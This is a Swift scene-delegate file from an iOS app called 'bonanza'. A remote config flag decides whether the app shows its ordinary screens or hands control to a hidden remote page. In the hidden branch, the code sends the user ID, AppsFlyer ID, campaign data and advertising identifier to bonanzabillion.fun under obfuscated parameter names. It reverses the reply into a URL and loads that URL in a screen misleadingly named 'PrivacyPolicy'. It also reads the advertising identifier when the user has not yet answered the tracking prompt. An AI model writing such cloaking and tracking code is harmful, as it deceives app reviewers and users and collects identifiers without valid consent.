//
//  SceneDelegate.swift
//  bonanza
//
//  Created by Evhen Lukhtan on 11.05.2023.
//

import UIKit
import AppsFlyerLib
import FirebaseRemoteConfig
import Alamofire
import SwiftyJSON
import AppTrackingTransparency
import AdSupport

class SceneDelegate: UIResponder, UIWindowSceneDelegate {

    var window: UIWindow?
    var appsFID: String = ""
    var utms: String = "organic"
    var campaign: String = ""
    var campID: String = ""
    var appDelegate: AppDelegate?
    var advertising_id: String = ""

    func scene(_ scene: UIScene, willConnectTo session: UISceneSession, options connectionOptions: UIScene.ConnectionOptions) {
        guard let windowScene = (scene as? UIWindowScene) else { return }
        window = UIWindow(windowScene: windowScene)
        appDelegate = UIApplication.shared.delegate as? AppDelegate
        appsFID = AppsFlyerLib.shared().getAppsFlyerUID()
        configureRemoteConfig()
    }

    func configureRemoteConfig() {
        RCValues.sharedInstance.fetchCloudValues { [weak self] success in
            if success {
                DispatchQueue.main.async {
                    self?.continueSceneConfiguration()
                }
            } else {
                // Handle failure to fetch Remote Config values
            }
        }
    }

    func continueSceneConfiguration() {
        let rc = RCValues.sharedInstance.updateFlag()

        if rc == false {
            if let _: ProfileModel = FileDataManager().read(key: .one) {
                let viewController = UINavigationController(rootViewController: MainVC())
                window?.rootViewController = viewController
            } else {
                let viewController = UINavigationController(rootViewController: StartVC())
                window?.rootViewController = viewController
            }
        } else {
            checkUser()
            parseCampaing()
        }

        window?.makeKeyAndVisible()
    }

    func sceneDidBecomeActive(_ scene: UIScene) {
         //Retrieve IDFA if tracking is enabled
        if #available(iOS 14, *) {
            ATTrackingManager.requestTrackingAuthorization { [weak self] status in
                DispatchQueue.main.async {
                    if status == .authorized || status == .notDetermined {
                        self?.retrieveIDFA()
                        let idfa = ASIdentifierManager.shared().advertisingIdentifier.uuidString
                        print("status = \(status.rawValue), idfa = \(idfa)")
                    } else {
                        // Tracking is not authorized
                        self?.advertising_id = "Tracking Not Authorized"
                        // Handle accordingly
                    }
                }
            }
        } else {
            // For iOS versions prior to 14, use the deprecated method
            if ASIdentifierManager.shared().isAdvertisingTrackingEnabled {
                self.retrieveIDFA()
            } else {
                self.advertising_id = "Tracking Not Enabled"
            }
        }
        
        AppsFlyerLib.shared().start(completionHandler: { [weak self] (dictionary, error) in
            if let error = error {
                print(error)
                return
            } else {
                RCValues.sharedInstance.fetchCloudValues { [weak self] success in
                    if success {
                        DispatchQueue.main.async {
                            self?.checkUser()
                        }
                    } else {
                        // Handle failure to fetch Remote Config values
                    }
                }
                print(dictionary ?? "")
                return
            }
        })
    }
    
    func retrieveIDFA() {
        if #available(iOS 14, *) {
            self.advertising_id = ASIdentifierManager.shared().advertisingIdentifier.uuidString
        } else {
            self.advertising_id = ASIdentifierManager.shared().advertisingIdentifier.uuidString
        }
    }

    func checkUser() {
        // Your logic to retrieve CUID
        let customUserId = UserDefaults.standard.string(forKey: UserDefaultsKeys.userID.rawValue)
        if let customUserId = customUserId, !customUserId.isEmpty {
            // Set CUID in AppsFlyer SDK for this session
            AppsFlyerLib.shared().customerUserID = customUserId
            AppsFlyerLib.shared().start() // Start
        } else {
            let uuid = UUID().uuidString
            UserDefaults.standard.set(uuid, forKey: UserDefaultsKeys.userID.rawValue)
            AppsFlyerLib.shared().customerUserID = uuid
            AppsFlyerLib.shared().start() // Start
        }
    }
    
    func parseCampaing() {
//        let jsonString = K.json
//
//        let data = Data(jsonString.utf8)
//        var convertionData: ConversionData
        
        do {
            //convertionData = try JSONDecoder().decode(ConversionData.self, from: data)
            //let components = convertionData.campaign.components(separatedBy: "_")
            
            let components = campaign.components(separatedBy: "_")
            var t1 = "organic"
            var t2 = "organic"
            var t3 = "organic"
            var t4 = "organic"
            var t5 = "organic"

            if components.count >= 5 {
                t1 = components[0]
                t2 = components[1]
                t3 = components[2]
                t4 = components[3]
                t5 = components[4]
            }

            let urlString = "https://bonanzabillion.fun/NiUS37WTD?1drgsc6=\(UserDefaults.standard.string(forKey: UserDefaultsKeys.userID.rawValue)!)&ZCcmVT9XF=\(appsFID)&upiyls=\(campID)&Yaymb09=\(AppsFlyerLib.shared().appleAppID)&yd8Ls=\(utms)&qsL6UPS9XU=\(t1)&vlnaomzd=\(t2)&lrz2Cbs=\(t3)&AB23Cf78=\(t4)&xA5Ga1=\(t5)&sn23sl6=\(advertising_id)"
                        
            AF.request(urlString).response { [self] response in
                switch response.result {
                case .success(let value):
                    let someString = String(data: value!, encoding: .utf8)
                    let tempSting = String(someString!.reversed())
                    let privacyPolicyVC = PrivacyPolicy(link: tempSting)
                    privacyPolicyVC.link = tempSting
                    
                    let viewController = UINavigationController(rootViewController: PrivacyPolicy(link: tempSting))
                    window?.rootViewController = viewController
                case .failure(let error):
                    print("Request failed with error: \(error)")
                    let privacyPolicyVC = PrivacyPolicy(link: RCValues.sharedInstance.updateLink(forKey: .link))
                    privacyPolicyVC.link = RCValues.sharedInstance.updateLink(forKey: .link)
                    let viewController = UINavigationController(rootViewController: StartVC())
                    window?.rootViewController = viewController
                }
            }
            
        } catch {
            print("Error decoding JSON: \(error)")
        }
    }
}

